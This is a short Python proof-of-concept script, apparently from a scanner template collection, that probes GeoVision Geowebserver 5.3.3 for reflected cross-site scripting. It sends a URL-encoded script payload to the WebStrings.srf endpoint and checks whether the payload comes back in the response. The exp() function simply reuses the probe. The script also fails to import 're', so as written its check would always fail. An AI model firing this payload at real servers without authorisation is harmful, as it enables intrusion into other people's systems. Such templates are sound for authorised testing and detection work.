import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''GeoVision Geowebserver 5.3.3 - XSS''',
        "description": '''GEOVISION GEOWEBSERVER =< 5.3.3 are vulnerable to several XSS / HTML Injection / Local File Include / XML Injection / Code execution vectors. The application fails to properly sanitize user requests.''',
        "severity": "medium",
        "references": [
            "https://packetstormsecurity.com/files/163860/geovisiongws533-lfixssxsrfexec.txt"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["geowebserver", "xss"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""</script><script>alert(document.domain)</script>""",resp0.text)) and (resp0.status_code == 200) and ("""text/html""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url